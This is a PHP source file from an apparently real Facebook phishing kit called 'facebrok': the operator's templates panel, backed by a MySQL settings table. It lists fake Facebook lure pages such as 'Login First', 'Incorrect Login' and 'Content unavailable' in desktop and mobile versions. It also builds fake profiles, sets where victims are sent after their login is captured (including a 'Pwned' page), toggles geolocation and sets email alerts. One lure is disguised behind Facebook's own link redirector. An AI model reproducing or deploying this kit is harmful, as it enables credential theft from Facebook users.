<?php
// facebrok 
// templates, method.
session_start();
error_reporting(0);
if($_SESSION['user']){
	include ("config.php");
	mysql_connect($DB_SERV,$DB_USER,$DB_PASS);
    mysql_select_db($DB_NADB);

	if($_GET['do']=="change"){
        $id=$_POST['id'];
        switch ($id) {
            case '1':
                $change="Changed Link Redirection";
                break;
            case '4':
                $change="Created Profile";
                break;
            case '3':
                $change="Changed Geolocation ";
                break;
            case '7':
                $change="Changed Email alert ";
                break;

        }
        include("method.php");
?>
<link rel="shortcut icon" href="facebook.png" />
<center><div class="alert"><?php echo $_SESSION['user'];?>/action > <?php echo $change;?> [DONE]</div></center>
<?php }
$red=mysql_query ("SELECT * FROM methods" );
$red=mysql_fetch_assoc($red);
$var=$red['value'];
$sql=mysql_query("SELECT * FROM methods WHERE id=3");
$row=mysql_fetch_array($sql);
$lang=$row['value']; 
if($row['other']==1){$geo="On";$geomar="Off";}else{$geo="Off";$geomar="On";}
if($lang=="es"){$f='<OPTION VALUE="es">Spanish</OPTION><OPTION VALUE="en">English</OPTION>';}else{$f='<OPTION VALUE="en">English</OPTION><OPTION VALUE="es">Spanish</OPTION>';}
$sql2=mysql_query("SELECT * FROM methods WHERE id=2");
$row2=mysql_fetch_array($sql2);
$email=$row2['other']; 
if($email==""){$email="empty";}
?>
<!--
 ______
 | ___|
 | |_____________________  ___ _______  __
 |  ______ | ___|  __ | |__| |/ /_ | | / /
 | || |  | | |  | ____| __ | | / | | |/ /
 | || |__| | |__| |___||_| |  /|_| |   |
 |_||____,,|____|_____|____|__|____|_|\_\
        one tool awesome for you.
-->
<title>facebrok - templates</title>
<link rel="shortcut icon" href="facebook.png" />
<link href="minify.css" rel="stylesheet" type="text/css"/>
<link href="login.css " rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript">
$(document).ready(function() {
    setTimeout(function() {
        $(".alert").fadeOut(1500);
    },3000);
});
</script>
<?php include ("bar.php"); ?>
<body class="login">
<style type="text/css" media="screen"><!--a:link   {text-decoration:none;}   --></style>
<div class="content">
<h4 class="form-title" title="methods"><center>templates<center></h4>
    <div align="left">
	<pre><a style="color:red">Information </a></pre>
	<pre><b>Link Redirection Current:</b><br><?php echo "$var";?><br><b>Geolocation:</b><?php echo "$geo";?><br><b>Email:</b><?php echo "$email";?>
	</pre>
<pre><a style="color:red">PRE templates</a></pre>
<form method="post" name="p" action="templates?do=change" >
<input type="hidden" name="id" value="3">
<fieldset>
<span style="color:#666;font-size:14"><span style="font-family: Arial;"><pre>
<input name="link" type="radio" value="<?php echo "$geomar";?>"> Geolocation   
<input type="submit" name="p" class="btn purple pull-right" value="Save">
</form>
</fieldset>
<form method="post" name="p" action="templates?do=change" >
<input type="hidden" name="id" value="7">
<fieldset>
<span style="color:#666;font-size:14"><span style="font-family: Arial;"><pre> Email Alert 
<input name="email" type="email" value=""> 
<input type="submit" name="p" class="btn purple pull-right" value="Save">
</form>
</fieldset>

<pre>
[Web]                         [Mobil]
[1]<a target="_blank" href="../unavailable">Content unavailable</a>         <font color="red">no</font>
[2]<a target="_blank" href="../stype?lo&jlou=AfdTGlz3ZWxSzf8MvpDhAIb5PxZeaux5ZFb_V8t7V95Xz3PQA8hT0DaxWa0UjyIbgmAUaoHRuqkittaecTEx2tKXN4zxk2ptBDq">Network Down</a>                <font color="red">no</font>
[3]<a target="_blank" href="../peopers">Not Found</a></center>                   <a target="_blank" href="../m/peopers"><font color="green">yes</font></a>
[4]<a target="_blank" href="../login.php?view=fbimga100mstartpre">Login First</a></center>                 <a target="_blank" href="../m/login.php?view=fbimga100mstartpre"><font color="green">yes</font></a>
[5]<a target="_blank" href="../login.php?login_attempt=1">Incorrect Login             <a target="_blank" href="../m/login.php?login_attempt=1"><font color="green">yes</font></a></center>
[6]<a target="_blank" href="../photo.php?img=Aff1ZNxvi-c_R7dnFV8uTF-8IdqOuEJNhkDs5v-Ol2ts78068HlR2ntZOUWINYmzf3dLH3mrebMUEKK4t-ISzzwIvhWKQVfTMr6oIjCPkR8C0tw&smuh=23612&lh=Ac9bg3B2dhJ-i_D">View photo</a>                  <font color="red">no</font></center>
[7]<a target="_blank" href="../game.php?news=Hfg_sd53">Play this </a>                  <font color="red">no</font></center>
[8]<a target="_blank" href="../href.php?url=www.youtube.com/watch?view=2jma2o421">Crashed Chrome </a>             <font color="red">no</font></center>
[9]<a target="_blank" href="../boom.php">Nyan Cat       </a>            <font color="red"> no</font></center>
[10]<a target="_blank" href="../l.php?u=www.youtube.com/watch?view=2jma2o421">Go to Video   </a>            <font color="red"> no</font></center>
[11]<a target="_blank" href="https://www.facebook.com/l.php?u=<?php echo 'http://'.$_SERVER["HTTP_HOST"].'/login.php?login_attempt=1';?>'">Go to me               </a>    <a target="_blank" href="https://www.facebook.com/l.php?u=<?php echo 'http://'.$_SERVER["HTTP_HOST"].'/m/login.php?login_attempt=1';?>"><font color="green">yes</a></font></center>
[12]<a target="_blank" href="../login.php?view=Mksl201shlsDS">B.Overflow               </a>  <font color="red">no</font></center>
</pre><br>
<pre>
[TheBest]<a style='cursor: pointer;' onclick=""> Profile Fake</a><div id="a"><form method="post" name="p" action="templates?do=change" ><input type="hidden" name="id" value="4">
Name               <input type="text" title="name fake" required="required" name="name" value="">
Url Profile Photo  <input type="text" title="profile imagen" required="required" name="img" value="">
Url Cover   Photo  <input type="text" title="cover imagen" required="required" name="cover" value="">
<br><input type="submit" name="p" class="btn purple pull-right" value="Create">
</form></div><br></pre>
<pre><a style="color:red">POST templetes</a></pre>
<a style='cursor: pointer;' onclick="">Link Redirection</a>
<div id="a">
<form method="post" name="p" action="templates?do=change">
<input type="text" title="link" required="required" name="link" value="http://"><br>
<input type="hidden" name="id" value="1">
<fieldset>
<span style="color:#666;font-size:14"><span style="font-family: Arial;"><pre>
<input name="link" type="radio" value="post"> POST facebook             High
<input name="link" type="radio" value="http://wikipedia.org/wiki/Pwned"> Pwned                     High
<input name="link" type="radio" value="https://www.facebook.com"> facebook                  Medium
<input name="link" type="radio" value="https://www.facebook.com/login"> facebook login            Medium
<input name="link" type="radio" value="unavalaible"> Content unavailable       Medium
<input name="link" type="radio" value="https://www.facebook.com/yessica"> Yessica                   Low
<input name="link" type="radio" value="https://scontent-a-mia.xx.fbcdn.net/hphotos-xpa1/t1.0-9/p180x540/1515000_246464335514473_2101084261_n.jpg"> imagen                    Low
<input name="link" type="radio" value="photo.php?v=642412492520394&set=vb.100002549479593&type=2&theater"> 404 Not Found             Low
<input name="link" type="radio" value="stype?lo&jlou=AfdTGlz3ZWxSzf8MvpDhAIb5PxZeaux5ZFb_V8t7V95Xz3PQA8hT0DaxWa0UjyIbgmAUaoHRuqkittaecTEx2tKXN4zxk2ptBDq"> Network Down              Low</fieldset>
</pre>
<input type="submit" name="p" class="btn purple pull-right" value="Save">
</form></div><br>
<div id="a">
</form></div><br>
<br><a title="Back" href="panel">
<span style="color:#666;font-size:14"><span style="font-family: Arial;">back</a>
<?php } else {header("location:../croak");} ?>